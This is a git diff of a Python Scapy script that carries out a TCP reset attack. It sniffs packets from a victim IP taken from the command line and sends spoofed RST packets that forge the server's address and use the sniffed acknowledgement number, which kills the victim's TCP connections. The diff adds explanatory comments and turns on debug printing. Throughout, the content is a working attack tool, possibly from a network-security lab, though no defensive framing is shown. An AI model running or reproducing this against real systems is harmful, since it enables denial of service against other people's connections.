@@ -14,54 +14,50 @@ victim_ip = sys.argv[1]
 
 def sendRST(pkt):
 
-    IPLayer = IP(dst=victim_ip, 
-        src=pkt[IP].dst)
+    IPLayer = IP(dst=victim_ip, #victim's ip
+        src=pkt[IP].dst)        #server's ip from sniffed packet
     
-    TCPLayer = TCP(flags="R", 
-        seq=pkt[TCP].ack, 
-        dport=pkt[TCP].sport, 
-        sport=pkt[TCP].dport)
+    TCPLayer = TCP(flags="R",   #reset flag
+        seq=pkt[TCP].ack,       #victim expecting this sequence number
+        dport=pkt[TCP].sport,   #victim's port number from sniffed packet
+        sport=pkt[TCP].dport)   #server's port number from sniffed packet
     
     spoofpkt = IPLayer/TCPLayer
 
     send(spoofpkt, verbose=2)
 
 
-    # print(pkt.summary())
+    print(pkt.summary())                            #sniffed packet
 
-    # print("IP source = " + str(pkt[IP].src))
-    # print("Port source = " + str(pkt[TCP].sport))
-    # print("IP dest = " + str(pkt[IP].dst))
-    # print("Port dest = " + str(pkt[TCP].dport))
-    # print("IP len = " + str(pkt[IP].len))
-    # print("SEQ = " + str(pkt[TCP].seq))
-    # print("ACK = " + str(pkt[TCP].ack))
-    # print("Window = " + str(pkt[TCP].window))
+    print("IP source = " + str(pkt[IP].src))        #victim ip
+    print("Port source = " + str(pkt[TCP].sport))   #victim port
+    print("IP dest = " + str(pkt[IP].dst))          #server ip
+    print("Port dest = " + str(pkt[TCP].dport))     #server port
+    print("ACK = " + str(pkt[TCP].ack))             #ack number
 
-    # print()
+    print()
 
-    # print(spoofpkt.summary())
 
-    # print("Spoofed IP source = " + str(spoofpkt[IP].src))
-    # print("Spoofed Port source = " + str(spoofpkt[TCP].sport))
-    # print("Spoofed IP dest = " + str(spoofpkt[IP].dst))
-    # print("Spoofed Port dest = " + str(spoofpkt[TCP].dport))
-    # print("Spoofed IP len = " + str(spoofpkt[IP].len))
-    # print("Spoofed SEQ = " + str(spoofpkt[TCP].seq))
-    # print("Spoofed ACK = " + str(spoofpkt[TCP].ack))
-    # print("Spoofed Window = " + str(spoofpkt[TCP].window))
+    print(spoofpkt.summary())
+
+    print("Spoofed IP source = " + str(spoofpkt[IP].src))
+    print("Spoofed Port source = " + str(spoofpkt[TCP].sport))
+    print("Spoofed IP dest = " + str(spoofpkt[IP].dst))
+    print("Spoofed Port dest = " + str(spoofpkt[TCP].dport))
+    print("Spoofed SEQ = " + str(spoofpkt[TCP].seq))   
 
     
+    print()    
+    print()
 
-    # print()    
-    # print()
+    time.sleep(randint(1, 2))   #random sleep
+                                #otherwise too much traffic
 
-    time.sleep(randint(1, 2))
 
 
 while 1:
-    pkt = sniff(filter="tcp and src host " + victim_ip, 
-        prn=sendRST, 
+    pkt = sniff(filter="tcp and src host " + victim_ip, #sniff victim's packet
+        prn=sendRST,                                    #spoofing function
         store=0, 
         count=1)
     
